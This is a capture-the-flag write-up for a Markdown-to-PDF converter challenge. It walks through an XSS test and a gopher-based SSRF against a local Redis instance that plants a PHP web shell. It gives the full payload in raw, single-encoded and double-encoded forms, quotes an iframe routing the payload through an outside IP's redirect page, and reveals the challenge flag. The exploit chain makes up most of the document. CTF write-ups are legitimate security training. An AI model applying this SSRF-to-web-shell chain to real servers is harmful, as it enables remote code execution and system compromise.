```
L'application AwesomeDoc permet de convertir du Markdown en HTML.

Vous pouvez même exporter le résultat en PDF !

    Retrouvez le secret à la racine du serveur
```

On the website, we can see a field, so we try XSS injection to write inside the PDF.
We can see on the script that `<script>` is blocked.
So we try with image:
```javascript
<img src="x" onerror="document.write(window.location)" />
```

I tried `FILE:///` inclusion but they seems disabled.

On the script we see a path to a file, and when we access it (`http://website-pjsc9e.inst.malicecyber.com/lib/wkhtmltopdf/wkhtmltopdf`), it gives:

```
#!/bin/bash

# usage :
#$ echo '<iframe src="http://80.247.1.68/redirect.php?a=gopher://127.0.0.1:6379/_%0D%0A*1%0D%0A$8%0D%0Aflushall%0D%0A*4%0D%0A$6%0D%0Aconfig%0D%0A$3%0D%0Aset%0D%0A$10%0D%0Adbfilename%0D%0A$7%0D%0Apwn.php%0D%0A*1%0D%0A$4%0D%0Asave%0D%0Aquit%0D%0A"></iframe>' | lib/wkhtmltopdf/wkhtmltopdf - 'data/outpit.pdf'
#$ echo '<iframe src="http://80.247.1.68/redirect.php?a=gopher://127.0.0.1:6379/_%0D%0A*1%0D%0A$8%0D%0Aflushall%0D%0A*4%0D%0A$6%0D%0Aconfig%0D%0A$3%0D%0Aset%0D%0A$10%0D%0Adbfilename%0D%0A$7%0D%0Apwn.php%0D%0A*1%0D%0A$4%0D%0Asave%0D%0Aquit%0D%0A"></iframe>)' | lib/wkhtmltopdf/wkhtmltopdf - 'data/outpit.pdf'

# L'expression rÃ©guliÃ¨re pour extraire l'URL avec diffÃ©rents protocoles
# et exclure les caractÃ¨res < et >
regex='(gopher)://[^[:space:]<>"]+'

# Le texte d'entrÃ©e passÃ© en pipe
read input
echo "You entered '$input'"

# Utilisation de la commande 'grep' pour extraire l'URL du texte
# '-o' : affiche uniquement les correspondances trouvÃ©es
# '-E' : permet l'utilisation d'expressions rÃ©guliÃ¨res Ã©tendues (pour le '|')
url=$(cat<<EOF | grep -o -E "$regex"
$input
EOF
)
echo $url

# VÃ©rifie si une URL a Ã©tÃ© trouvÃ©e
if [ ${#url} -ge 1 ]; then
    echo "URL trouvÃ©e : $url"
    # Effectue une requÃªte avec 'curl' vers l'URL trouvÃ©e
    cat<<EOF | curl --config -
 --url "$url"
EOF
fi

cat<<EOF | lib/wkhtmltopdf/wkhtmltopdf.origin --disable-local-file-access - "$2"
$input
EOF

exit $?

```

I don't know much about gopher wrapper, but seems like it's time to learn !

After a YEAR of searching and learning how gopher and Redit DB works, i made this payload:
```
gopher://127.0.0.1:6379/_
*1
$8
flushall
*3
$3
set
$1
1
$37
<?php echo passthru($_GET['cmd']); ?>
*4
$6
config
$3
set
$10
dbfilename
$7
pwn.php
*1
$4
save
*1
$4
quit
```

Then i encoded its content (not url !) once:
```
gopher://127.0.0.1:6379/_%0D%0A*1%0D%0A$8%0D%0Aflushall%0D%0A*3%0D%0A$3%0D%0Aset%0D%0A$1%0D%0A1%0D%0A$37%0D%0A%3C%3Fphp%20echo%20passthru%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0D%0A*4%0D%0A$6%0D%0Aconfig%0D%0A$3%0D%0Aset%0D%0A$10%0D%0Adbfilename%0D%0A$7%0D%0Apwn.php%0D%0A*1%0D%0A$4%0D%0Asave%0D%0A*1%0D%0A$4%0D%0Aquit%0D%0A
```

And burp did it a second time:

```
gopher%3a%2f%2f127.0.0.1%3a6379%2f_%250D%250A*1%250D%250A%248%250D%250Aflushall%250D%250A*3%250D%250A%243%250D%250Aset%250D%250A%241%250D%250A1%250D%250A%2437%250D%250A%253C%253Fphp%2520echo%2520passthru%2528%2524_GET%255B%2527cmd%2527%255D%2529%253B%2520%253F%253E%250D%250A*4%250D%250A%246%250D%250Aconfig%250D%250A%243%250D%250Aset%250D%250A%2410%250D%250Adbfilename%250D%250A%247%250D%250Apwn.php%250D%250A*1%250D%250A%244%250D%250Asave%250D%250A*1%250D%250A%244%250D%250Aquit%250D%250A
```

And then i get the flag by going on the `pwn.php?cmd=cat /FLAG` page !

Flag was `DGHACK{D0uble_1s_always_better}` !
